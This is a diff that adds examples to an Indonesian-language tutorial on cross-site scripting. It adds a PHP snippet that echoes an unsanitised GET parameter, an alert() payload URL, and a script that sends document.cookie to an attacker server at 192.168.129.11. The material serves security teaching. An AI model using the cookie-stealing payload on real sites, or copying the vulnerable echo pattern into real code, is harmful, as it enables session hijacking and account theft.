@@ -182,9 +182,40 @@ Serangan berupa **HTML injection** yang lolos karena **developer** tidak mampu m
 
 <img src="assets/xss1.png" style="zoom:100%;" />
 
+Contoh **innocent code** **di back-end**,
+
+```php
+<?php
+$input = $_GET["param"];
+echo "<div>".$input."</div>";
+?>
+```
+
+Tidak terdapat Validation, Sanitazion atau Whitelist strategy. 
+
+Jika user awam yang memberikan data normalnya seperti ini :
+
+http://www.gun.com/test.php?param= nama Maudy Ayunda.
+
+Tapi **attacker** akan memberikan **input malicious script** yang lain misal :
+
+http://www.gun.com/test.php?param=**<script>alert(/xss/)</script>**
+
+Input yang dikirimkan pada kasus di atas adalah malicious script sederhana, realitanya lebih kompleks dan menyeramkan dari script di atas.
+
 **Malicious Script** memiliki akses penuh terhadap seluruh **objects** dalam **browser environment**. Hal yang dapat terjadi selanjutnya adalah **session hijacking**. **Cookies** tempat menyimpan **session** bisa diambil, **attacker** dapat menyamar, mencuri data dan bertindak seolah-olah seperti pengguna (pemilik **session**). 
 
+**Cookies** yang dicuri datanya akan dikirimkan menuju **remote server** milik **attacker** untuk disimpan.
+
 <img src="assets/xss2.png" style="zoom:100%;" />
+
+Di bawah ini adalah contoh **malicious script** yang dapat digunakan untuk membuat **object** **image** dalam web kemudian **attribute src** yang dimiliki **element** tersebut di arahkan menuju remote server milik **attacker**, data yang dikirimkan adalah **cookies**.
+
+```javascript
+<script>new Image().src="http://192.168.129.11/mimiperi.php?output="+document.cookie;</script>
+```
+
+
 
 #### XSS Cheatsheet
 
